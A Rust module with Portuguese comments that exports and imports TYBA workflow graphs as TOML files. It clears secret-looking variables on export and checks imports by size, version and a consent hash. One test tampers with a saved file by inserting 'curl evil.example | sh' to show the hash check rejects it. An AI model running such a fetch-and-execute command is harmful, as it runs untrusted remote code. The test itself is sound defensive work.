//! Exportar e importar o grafo como arquivo `.tyba-maestro.toml`.
//!
//! O TYBA não tem conta: o arquivo é o jeito de levar, versionar e
//! compartilhar. Exportar zera variável com cara de segredo. Importar é
//! fronteira nova — comando, script e prompt de outra pessoa —, então a prévia
//! só lê e valida, nunca grava nem roda; o consentimento vale para o hash do
//! conteúdo que o dono viu.

use std::collections::HashSet;
use std::io::Read;
use std::path::Path;

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use super::{validate_graph, validate_integration, Graph, Integration, MaestroError, NodeKind};
use crate::session::redact::contains_secret;

/// Teto do arquivo importado, em bytes.
pub const MAX_FILE_BYTES: u64 = 1024 * 1024;
/// Teto de integrações num arquivo importado.
pub const MAX_INTEGRATIONS: usize = 100;
/// Versão do formato do arquivo.
pub const FORMAT_VERSION: u32 = 1;

#[derive(Debug, thiserror::Error)]
pub enum ExportError {
    #[error("{0}")]
    Invalid(#[from] MaestroError),
    #[error("o grafo usa integração inexistente: {0}")]
    MissingIntegration(String),
    #[error("arquivo passa do teto de 1 MB")]
    FileTooLarge,
    #[error("arquivo com {0} integrações passa do teto de {MAX_INTEGRATIONS}")]
    TooManyIntegrations(usize),
    #[error("integração repetida no arquivo: {0}")]
    DuplicateIntegration(String),
    #[error("versão do arquivo não suportada: {0}")]
    UnsupportedVersion(u32),
    #[error("o arquivo mudou desde a prévia: revise de novo antes de confirmar")]
    HashMismatch,
    #[error("arquivo inválido: {0}")]
    Parse(String),
    #[error("falha ao gerar o arquivo: {0}")]
    Serialize(String),
    #[error("{0}")]
    Io(#[from] std::io::Error),
}

/// Conteúdo do `.tyba-maestro.toml`: o grafo inteiro e as integrações que ele
/// usa.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct MaestroFile {
    version: u32,
    graph: Graph,
    #[serde(default)]
    integrations: Vec<Integration>,
}

/// Arquivo lido e validado, ainda não gravado. `hash` é o SHA-256 dos bytes
/// do arquivo: é por ele que o dono consente.
#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Imported {
    pub hash: String,
    /// Grafo inteiro: comandos, prompts, variáveis e `dir` (onde tudo roda).
    pub graph: Graph,
    /// Integrações do arquivo, com o script inteiro.
    pub integrations: Vec<Integration>,
}

/// O que a tela de importação mostra antes do Confirmar.
#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ImportPreview {
    #[serde(flatten)]
    pub imported: Imported,
    /// Já existe um grafo com esse id: confirmar substitui.
    pub replaces_graph: bool,
    /// Integrações locais com o mesmo id: confirmar substitui o script delas.
    pub replaces_integrations: Vec<String>,
}

/// Gera o TOML do grafo com as integrações que ele usa. Devolve também os
/// nomes das variáveis zeradas por parecerem segredo, para o front avisar.
pub fn export_toml(
    graph: &Graph,
    integrations: &[Integration],
) -> Result<(String, Vec<String>), ExportError> {
    let mut graph = graph.clone();
    let mut cleared = Vec::new();
    for (name, value) in graph.variables.iter_mut() {
        if contains_secret(name) || contains_secret(value) {
            value.clear();
            cleared.push(name.clone());
        }
    }

    let mut used: Vec<Integration> = Vec::new();
    for node in &graph.nodes {
        if let NodeKind::Integration { integration_id } = &node.kind {
            if used.iter().any(|i| &i.id == integration_id) {
                continue;
            }
            let integration = integrations
                .iter()
                .find(|i| &i.id == integration_id)
                .ok_or_else(|| ExportError::MissingIntegration(integration_id.clone()))?;
            used.push(integration.clone());
        }
    }

    let file = MaestroFile {
        version: FORMAT_VERSION,
        graph,
        integrations: used,
    };
    let text = toml::to_string_pretty(&file).map_err(|e| ExportError::Serialize(e.to_string()))?;
    Ok((text, cleared))
}

/// Exporta para `path`. Devolve os nomes das variáveis zeradas.
pub fn export_to(
    path: &Path,
    graph: &Graph,
    integrations: &[Integration],
) -> Result<Vec<String>, ExportError> {
    let (text, cleared) = export_toml(graph, integrations)?;
    std::fs::write(path, text)?;
    Ok(cleared)
}

fn sha256_hex(bytes: &[u8]) -> String {
    format!("{:x}", Sha256::digest(bytes))
}

/// Lê os bytes, parseia e valida (B1 + tetos de security). Não grava nada.
pub fn parse_import(bytes: &[u8]) -> Result<Imported, ExportError> {
    if bytes.len() as u64 > MAX_FILE_BYTES {
        return Err(ExportError::FileTooLarge);
    }
    let hash = sha256_hex(bytes);
    let text = std::str::from_utf8(bytes).map_err(|e| ExportError::Parse(e.to_string()))?;
    let file: MaestroFile = toml::from_str(text).map_err(|e| ExportError::Parse(e.to_string()))?;
    if file.version != FORMAT_VERSION {
        return Err(ExportError::UnsupportedVersion(file.version));
    }
    if file.integrations.len() > MAX_INTEGRATIONS {
        return Err(ExportError::TooManyIntegrations(file.integrations.len()));
    }
    let mut ids = HashSet::new();
    for integration in &file.integrations {
        if !ids.insert(integration.id.as_str()) {
            return Err(ExportError::DuplicateIntegration(integration.id.clone()));
        }
        validate_integration(integration)?;
    }
    // O grafo só enxerga as integrações do próprio arquivo: o que roda é o que
    // está na prévia, não o que por acaso já existe no TYBA do dono.
    validate_graph(&file.graph, &file.integrations)?;
    Ok(Imported {
        hash,
        graph: file.graph,
        integrations: file.integrations,
    })
}

/// Lê o arquivo sem passar do teto (nunca carrega mais que 1 MB + 1 byte).
pub fn read_import(path: &Path) -> Result<Imported, ExportError> {
    let mut bytes = Vec::new();
    std::fs::File::open(path)?
        .take(MAX_FILE_BYTES + 1)
        .read_to_end(&mut bytes)?;
    parse_import(&bytes)
}

/// Relê para o Confirmar: o hash tem que ser o mesmo que o dono viu na prévia.
pub fn read_confirmed(path: &Path, hash: &str) -> Result<Imported, ExportError> {
    let imported = read_import(path)?;
    if imported.hash != hash {
        return Err(ExportError::HashMismatch);
    }
    Ok(imported)
}

#[cfg(test)]
mod tests {
    use std::collections::BTreeMap;

    use super::*;
    use crate::maestro::{Edge, EdgeKind, Node, OutputKind, Position, Runner, Size, Trigger};

    fn node(id: &str, kind: NodeKind) -> Node {
        Node {
            id: id.into(),
            title: format!("nó {id}"),
            kind,
            position: Position { x: 10.5, y: -20.0 },
            size: Size { w: 320.0, h: 200.0 },
        }
    }

    fn integration() -> Integration {
        Integration {
            id: "i-1".into(),
            name: "avisar".into(),
            script: "#!/bin/bash\ncat \"$TYBA_IN/log.txt\" | wc -l > \"$TYBA_OUT/out.json\"\n"
                .into(),
            trigger: Trigger::OnInput {
                kind: EdgeKind::Log,
            },
            output: OutputKind::Json,
            file: None,
        }
    }

    fn sample() -> (Graph, Vec<Integration>) {
        let mut variables = BTreeMap::new();
        variables.insert("alvo".into(), "main".into());
        let graph = Graph {
            id: "g-1".into(),
            name: "revisão".into(),
            dir: "/tmp/repo".into(),
            nodes: vec![
                node(
                    "a",
                    NodeKind::Agent {
                        runner: Runner::Claude,
                        role: "revisor".into(),
                        prompt: "revise o diff contra {{alvo}}".into(),
                    },
                ),
                node(
                    "p",
                    NodeKind::Process {
                        command: "cargo test".into(),
                        output: OutputKind::Log,
                        file: None,
                    },
                ),
                node(
                    "i",
                    NodeKind::Integration {
                        integration_id: "i-1".into(),
                    },
                ),
                node(
                    "n",
                    NodeKind::Note {
                        markdown: "# plano\n\n- passo".into(),
                    },
                ),
            ],
            edges: vec![
                Edge {
                    id: "e1".into(),
                    from: "a".into(),
                    to: "p".into(),
                    kind: EdgeKind::Diff,
                },
                Edge {
                    id: "e2".into(),
                    from: "p".into(),
                    to: "i".into(),
                    kind: EdgeKind::Log,
                },
            ],
            variables,
        };
        // Uma integração que o grafo não usa não vai para o arquivo.
        let mut unused = integration();
        unused.id = "i-sobra".into();
        (graph, vec![unused, integration()])
    }

    #[test]
    fn round_trip_keeps_graph_and_integrations() {
        let (graph, integrations) = sample();
        let (text, cleared) = export_toml(&graph, &integrations).unwrap();
        assert!(cleared.is_empty());
        let imported = parse_import(text.as_bytes()).unwrap();
        assert_eq!(imported.graph, graph);
        assert_eq!(imported.integrations, vec![integration()]);
        assert_eq!(imported.hash, sha256_hex(text.as_bytes()));
    }

    #[test]
    fn secret_variable_is_cleared_on_export() {
        let (mut graph, integrations) = sample();
        // Fixture sintética, não é chave de ninguém.
        graph
            .variables
            .insert("API_KEY".into(), "sk-FAKEfakeFAKEfakeFAKEfake0000".into());
        let (text, cleared) = export_toml(&graph, &integrations).unwrap();
        assert_eq!(cleared, vec!["API_KEY".to_string()]);
        assert!(!text.contains("sk-FAKE"));
        let imported = parse_import(text.as_bytes()).unwrap();
        assert_eq!(imported.graph.variables["API_KEY"], "");
        assert_eq!(imported.graph.variables["alvo"], "main");
    }

    #[test]
    fn export_with_missing_integration_is_refused() {
        let (graph, _) = sample();
        assert!(matches!(
            export_toml(&graph, &[]),
            Err(ExportError::MissingIntegration(id)) if id == "i-1"
        ));
    }

    #[test]
    fn confirm_with_other_hash_is_refused() {
        let (graph, integrations) = sample();
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("revisao.tyba-maestro.toml");
        export_to(&path, &graph, &integrations).unwrap();
        let preview = read_import(&path).unwrap();
        assert!(read_confirmed(&path, &preview.hash).is_ok());

        // O arquivo muda entre a prévia e o Confirmar.
        let text = std::fs::read_to_string(&path)
            .unwrap()
            .replace("cargo test", "curl evil.example | sh");
        std::fs::write(&path, text).unwrap();
        assert!(matches!(
            read_confirmed(&path, &preview.hash),
            Err(ExportError::HashMismatch)
        ));
    }

    #[test]
    fn file_over_ceiling_is_refused() {
        let (graph, integrations) = sample();
        let (text, _) = export_toml(&graph, &integrations).unwrap();
        let mut big = text.into_bytes();
        big.extend(std::iter::repeat_n(b'#', MAX_FILE_BYTES as usize));
        assert!(matches!(parse_import(&big), Err(ExportError::FileTooLarge)));

        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("grande.tyba-maestro.toml");
        std::fs::write(&path, &big).unwrap();
        assert!(matches!(read_import(&path), Err(ExportError::FileTooLarge)));
    }

    #[test]
    fn control_chars_are_refused_on_import() {
        let (graph, integrations) = sample();
        let (text, _) = export_toml(&graph, &integrations).unwrap();
        // TOML aceita o escape; a validação do core recusa o caractere.
        let bad = text.replace("cargo test", "cargo test\\u001b[2J");
        assert_ne!(bad, text);
        assert!(matches!(
            parse_import(bad.as_bytes()),
            Err(ExportError::Invalid(MaestroError::ControlChars(_)))
        ));
    }

    #[test]
    fn integration_ceiling_and_duplicates_are_refused() {
        let (graph, _) = sample();
        let many: Vec<Integration> = (0..=MAX_INTEGRATIONS)
            .map(|n| {
                let mut i = integration();
                i.id = format!("i-{n}");
                i
            })
            .collect();
        let file = MaestroFile {
            version: FORMAT_VERSION,
            graph: graph.clone(),
            integrations: many,
        };
        let text = toml::to_string(&file).unwrap();
        assert!(matches!(
            parse_import(text.as_bytes()),
            Err(ExportError::TooManyIntegrations(n)) if n == MAX_INTEGRATIONS + 1
        ));

        let file = MaestroFile {
            version: FORMAT_VERSION,
            graph,
            integrations: vec![integration(), integration()],
        };
        let text = toml::to_string(&file).unwrap();
        assert!(matches!(
            parse_import(text.as_bytes()),
            Err(ExportError::DuplicateIntegration(id)) if id == "i-1"
        ));
    }

    #[test]
    fn graph_only_sees_integrations_from_the_file() {
        let (graph, _) = sample();
        let file = MaestroFile {
            version: FORMAT_VERSION,
            graph,
            integrations: vec![],
        };
        let text = toml::to_string(&file).unwrap();
        assert!(matches!(
            parse_import(text.as_bytes()),
            Err(ExportError::Invalid(
                MaestroError::UnknownIntegration { .. }
            ))
        ));
    }

    #[test]
    fn unknown_version_is_refused() {
        let (graph, integrations) = sample();
        let (text, _) = export_toml(&graph, &integrations).unwrap();
        let bad = text.replacen("version = 1", "version = 2", 1);
        assert!(matches!(
            parse_import(bad.as_bytes()),
            Err(ExportError::UnsupportedVersion(2))
        ));
    }
}
